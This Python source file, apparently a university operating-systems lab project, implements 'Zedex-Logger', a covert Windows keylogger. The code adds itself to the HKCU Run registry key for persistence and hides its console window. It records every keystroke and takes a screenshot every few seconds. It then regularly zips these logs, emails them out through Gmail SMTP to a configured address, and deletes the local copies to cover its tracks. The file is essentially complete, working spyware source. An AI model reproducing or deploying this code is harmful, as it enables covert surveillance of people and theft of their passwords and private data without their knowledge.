# **********         Zedex-Logger       ***********


# Operating System Labs Semester Project
# Noor Muhammad - CS 171029
# Usama Imran -
# Syed Darij Ali -


# -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- #

#Importing nessasary Modules

#sys -> input output using cli aurguments by using (sys.argv)
#win32api -> to capture or manipulate the win32 applications
    #on Windows by using win32 Windows API
#pythoncom -> for windows inter-process communicaton mechanism
#pyHook -> pyHook library wraps the low-level mouse and keyboard hooks
    #in the Windows Hooking API for use in Python applications
    #To know more : https://sourceforge.net/p/pyhook/wiki/PyHook_Tutorial/
#os module -> Operating system depandent functionality
#time module -> to handle time related tasks
#base64 -> module for encoding and decoding binary string into text string
#winreg -> access of windows registry files to run the program on startup
#pyautogui -> to control mouse and keyboard programmically & use to take screenshots

# -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- -x- #

import sys
import win32api, pythoncom
import pyHook, base64
import os, time, random, smtplib, string
import winreg
import pyautogui
from pynput import keyboard, mouse
from apscheduler.schedulers.background import BackgroundScheduler

#########################

##   GLLOBAL VARIABLES ##
global file_path

##    USER SETTINGS    ##
your_email = '###'
your_email_pass = '###'
email_send_to = "###"
email_time_interval = 22       #Time to wait before sending data to email (in seconds)
screenshot_time_interval = 5   #seconds

## Defining Functions ##

def folder_config(file_path, op):
    folder_path = file_path + str('\logs')
    print(folder_path+'.zip')

    if op == 'create':
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            return True
        return False
    elif op == 'delete':
        if os.path.exists(folder_path):
            from shutil import rmtree
            rmtree(folder_path)
            return True
        return False

def start_up():
    global file_path
    
    # returning current directory where the program is located
    file_path = os.path.dirname(os.path.realpath(__file__));
    
    # returning the program name
    file_name =  sys.argv[0]

    # concatinated the directory and file location.
    full_file_path = file_path + '\\' + file_name
    
    # Key_val set to the path of Widnows Registry
    key_val = 'Software\Microsoft\Windows\CurrentVersion\Run'

    # Open and return the Object of HKEY with key of location in key_val,
    # With Access Right of ALL_ACCESS
    key_to_open = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)    

    #Set the Value at the Object of key_to_open with Name Zedex-Logger
    #Type: REG_SZ, and Data is the full path of keylogger
    winreg.SetValueEx(key_to_open, 'Zedex-Logger', 0, winreg.REG_SZ, full_file_path)

    key_to_open.Close()
     
def hide():
    import win32console
    import win32gui
    panel = win32console.GetConsoleWindow()
    win32gui.ShowWindow(panel,0)


def screenshot():
    print('screenshot')
    global file_path

    # generate a name for screenshot of 7 digits mixed
    # with uppercase Alpha numeric characters.
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                                     + string.digits)
                                       for _ in range(7))
    name = str(generate_name() + '.png')
    pyautogui.screenshot().save(f'{file_path}/logs/{name}')

def mail():
    global file_path
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
    from shutil import make_archive
    
    folder_path = file_path + str('\logs')
    make_archive('logs', 'zip', folder_path)
    
    local_time = time.strftime('%Y/%m/%d - %H:%M:%S', time.localtime())
    zip_archive = open(f'{file_path}\\logs.zip', 'rb')

    msg = MIMEMultipart()
    msg['from'] = your_email
    msg['to'] = email_send_to
    msg['subject'] = f'Logs Recieved at: [{local_time}]'

    #section content type specified
    msg_part = MIMEBase('application', 'octet-stream')
    #fancy word of adding a section. could be multiple in a email
    msg_part.set_payload((zip_archive).read())
    #encoding the section into base64 for SMTP
    encoders.encode_base64(msg_part)
    #adding headers so that email would recieve proper defined fiels.
    msg_part.add_header('Content-Disposition','application; fileName=logs.zip')

    #adding the section into main email body
    msg.attach(msg_part)
    #make the encoded email into string object
    text = msg.as_string()
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    #upgrading unsecuring connection to secure connection
    server.starttls()
    server.login(your_email, your_email_pass)
    server.sendmail(your_email, email_send_to, text)
    server.close()

    print('Email Sent SuccessFul')

    #Remove log directory and log.zip
    folder_config(file_path, 'delete')

def on_mouse_click(x, y, button, pressed):
    print("mocuse clikc")
    global file_path

    mouse_data = f'''\n[Mouse Time Stamp: {str(time.ctime().split(' ')[3])}]
                     Button Clicked: {button}
                     Click Position: [{x}, {y}]
                   = = = = = = = = = = = = = = = = = = = = = = = = '''
    folder_config(file_path, 'create')

    f = open(f'{file_path}\\logs\\MouseLogFile.txt', 'a')
    f.write(mouse_data)
    f.close()

    return True
    
def on_keyboard_press(key):
    print('keybaord called')
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r' or letter == 'Key.shift_l':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'key.backspace':
        letter == '[BACKSPACE]'

    folder_config(file_path, 'create')
     
    with open(f'{file_path}\\logs\\KeyboardLogFile.txt', 'a') as f:
        f.write(letter)

    return True

##  MAIN BODY ##
start_up()
hide()

# Setting screenshot Scheduler
screenshot_scheduler = BackgroundScheduler()
screenshot_scheduler.start()
screenshot_scheduler.add_job(screenshot, 'interval', seconds = screenshot_time_interval)

# setting email scheduler
email_scheduler = BackgroundScheduler()
email_scheduler.start()
email_scheduler.add_job(mail, 'interval', seconds = email_time_interval)

#event listener for Mouse onkeypress listening infinity
#with mouse.Listener(on_click = on_mouse_click) as m:
#    m.join()
    
#event listener for keyboard onkeypress listening infinity
with keyboard.Listener(on_press = on_keyboard_press) as l:
    l.join()
